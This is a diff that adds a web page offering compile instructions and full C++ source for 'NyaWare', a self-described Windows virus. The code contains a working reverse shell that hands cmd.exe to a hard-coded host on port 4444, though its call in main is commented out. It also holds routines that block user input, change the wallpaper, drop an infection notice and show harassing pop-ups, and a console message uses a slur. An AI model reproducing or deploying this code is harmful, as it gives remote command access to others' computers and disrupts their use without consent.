@@ -1,0 +1,215 @@
+
+
+<!DOCTYPE html>
+<head>
+    <title>NyaWare~</title>
+    <link rel="stylesheet" href="https://2983u2.site/src/style.css">
+</head>
+<body>
+    <div class="col-sm-8 text-left"> 
+        <hr>
+        <a href="https://2983u2.site">Go back</a>
+        <h1>How to compile (Due to security issues you will have to compile yourself.)</h1>
+        <p>
+            1.) Make a direcory named "sources", make a file inside the directory named "words.txt" then paste this inside.
+        </p>
+        <pre>
+            <code>
+                Hop_on_valorant_:3 Your_a_silly_boykisser! Minecraft>>Fortnite 2983u2_Owns_This_Host
+            </code>
+        </pre>
+        <p>
+            2.) Paste the source code inside the same directory where is sources at.
+        </p>
+        <a href="https://www.msys2.org/">3.) Download using g++ with this method</a>
+        <p>
+            4.) Compile command (takes a while based on hardware)
+        </p>
+        <pre>
+            <code>
+                g++ NAME.cpp -o NAME -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+            </code>
+        </pre>
+        <h3>Latest version.</h3>
+        <pre>
+            <code>
+                    #include <iostream>
+                    #include <fstream>
+                    #include <cstdlib>
+                    #include <conio.h>
+                    #include <vector>
+                    #include <string>
+                    #include <ctime>
+                    #include <map>
+                    #include <stdio.h>
+                             // Windows libaries
+                    #include <winsock2.h>
+                    #include <windows.h>
+                    #include <winuser.h>
+                    #include <winable.h>
+                            // Stuffs
+                    #pragma comment(lib, "user32.lib")
+                    #pragma comment(lib, "Winmm.lib")
+                    #pragma comment(lib, "w2_32")
+                    
+                    WSADATA wsaData;
+                    SOCKET wSock;
+                    struct sockaddr_in hax;
+                    STARTUPINFO sui;
+                    PROCESS_INFORMATION pi;
+                    
+                    int ReverseShell()
+                    {
+                      std::string status;
+                      const char* ip = "192.168.12.109";
+                      int port = 4444;
+                      WSAStartup(MAKEWORD(2, 2), &wsaData);
+                      wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+                      hax.sin_family = AF_INET;
+                      hax.sin_port = htons(port);
+                      hax.sin_addr.s_addr = inet_addr(ip);
+                      WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
+                      memset(&sui, 0, sizeof(sui));
+                      sui.cb = sizeof(sui);
+                      sui.dwFlags = STARTF_USESTDHANDLES;
+                      sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;
+                      CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
+                      return 0;
+                    }
+                    
+                    // Send random message every 15 seconds.
+                    // Message query: "hop on valorant :3", ""
+                    int randomMessage()
+                    {
+                        std::string MSG;
+                        std::ifstream inFile;
+                        inFile.open ("sources/words.txt");
+                        std::vector< std::string > dict;
+                        dict.reserve (80500);
+                        std::string temp;
+                        while (inFile >> temp)
+                            dict.push_back (temp);
+                        inFile.close ();
+                        srand (time (NULL));
+                        int index = rand () % dict.size ();
+                        std::string hangManWord = dict [ index ];
+                        LPCSTR s = hangManWord.c_str();
+                        MSG = MessageBox(NULL, s, "NyaWare ", MB_OKCANCEL);
+                        return 0;
+                    }
+                    
+                    int changeWallpaper()
+                    {
+                    
+                        std::cout << "changeWallpaper: Changing Wallpaper!" << std::endl;
+                        const wchar_t *file_path = L"C:/Users/voorh/Desktop/ScawyMalware0w0/R.bmp";
+                        int result = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)file_path, SPIF_UPDATEINIFILE);
+                        std::cout << "changeWallpaper: Changed Wallpaper!" << std::endl;
+                        return 0;
+                    }
+                    
+                    int noti()
+                    {
+                        int something;
+                        int something2;
+                        int something3;
+                        int something4;
+                        something = MessageBox(NULL, "Welcome to the NyaWare  virus.\nClick 'OK'\n'cancel' For links", "NyaWare ", MB_OKCANCEL);
+                        if (something == IDOK)
+                        {
+                            // DOSOMETHING
+                            something2 = MessageBox(NULL, "Are you really sureeeeeeeee?", "NyaWare ", MB_OKCANCEL);
+                            if (something2 == IDOK)
+                            {
+                                // DOSOMETHING
+                                std::cout << "NyaWare : Initialzed." << std::endl;
+                                something3 = MessageBox(NULL, "Click 'OK' to run.", "NyaWare ", MB_OKCANCEL);
+                                if (something3 == IDOK)
+                                {
+                                    std::cout << "We warned em..." << std::endl;
+                                }
+                                else 
+                                {
+                                    std::cout << "NyaWare: Exiting" << std::endl;
+                                    exit(0);
+                                }
+                            }
+                            else 
+                            {
+                                std::cout << "NyaWare: Exiting" << std::endl;
+                                exit(0);
+                            }
+                        }
+                        else
+                        {
+                            std::cout << "User clicked 'help' !" << std::endl;
+                            something4 = MessageBox(NULL, "Github: PLACEHOLDER\nMake a PR for help or reporting bugs\nDiscord: 2983u2", "HELP", MB_ICONINFORMATION);
+                            std::cout << "NyaWare: Exiting" << std::endl;
+                            exit(0);
+                        }
+                        return 0;
+                    }
+                    
+                    BOOL IsProgramRunningAsAdmin() 
+                    {
+                        BOOL isAdmin = FALSE;
+                        PSID adminSID = NULL;
+                        // Allocate and initialize SID for the local administrators group.
+                        SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+                        if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminSID))
+                        {
+                            // Check if the current process token is a member of the local administrators group.
+                            if (!CheckTokenMembership(NULL, adminSID, &isAdmin))
+                            {
+                                isAdmin = FALSE;
+                            }
+                            // Clean up the allocated SID.
+                            FreeSid(adminSID);
+                        }
+                    
+                        return isAdmin;
+                    }
+                    
+                    int main()
+                    {
+                        SYSTEM_INFO siSysInfo;
+                        GetSystemInfo(&siSysInfo);
+                        int message;
+                        // Notify the victim that they've been infected
+                        if (!IsProgramRunningAsAdmin)
+                        {
+                            std::cout << "God this guy is a fucking retard...." << std::endl;
+                        }
+                        system("cls");
+                        noti();
+                        std::cout << "ReverseShell: Started!" << std::endl;
+                        //ReverseShell();
+                        std::cout << "Hardware info: " << std::endl;
+                        std::cout << "OEM ID: " << siSysInfo.dwOemId << std::endl;
+                        std::cout << "Number of processors: " << siSysInfo.dwNumberOfProcessors << std::endl;
+                        std::ofstream notice ("readme.txt");
+                        std::cout << "NoticeSection: File Created" << std::endl; 
+                        notice << "NN   NN                 WW      WW" << std::endl;                       
+                        notice << "NNN  NN yy   yy   aa aa WW      WW   aa aa rr rr    eee  " << std::endl;
+                        notice << "NN N NN yy   yy  aa aaa WW   W  WW  aa aaa rrr  r ee   e " << std::endl;
+                        notice << "NN  NNN  yyyyyy aa  aaa  WW WWW WW aa  aaa rr     eeeee  " << std::endl;
+                        notice << "NN   NN      yy  aaa aa   WW   WW   aaa aa rr      eeeee " << std::endl;
+                        notice << "          yyyyy                                          \n\n\n\n\n\n\n\n";
+                        notice << "Hello user.\n    You've been infected by the NyaWare" << std::endl;
+                        std::cout << "NoticeSection: Wrote to File" << std::endl;
+                        notice.close();
+                        std::cout << "NoticeSection: File Closed" << std::endl;
+                        changeWallpaper();
+                        std::cout << "NyaWare: StartedBlockingInput" << std::endl;
+                        BlockInput(true);
+                        message = MessageBox(NULL, "I see you :3", "NyaWare", MB_OKCANCEL);
+                        randomMessage();
+                        Sleep(10000);
+                        BlockInput(false);
+                        std::cout << "NyaWare: StoppedBlockingInput" << std::endl;
+                        std::cout << "NyaWare: VIRUS ENDED" << std::endl;
+                    }
+            </code>
+        </pre>
+    </div>
+</body>
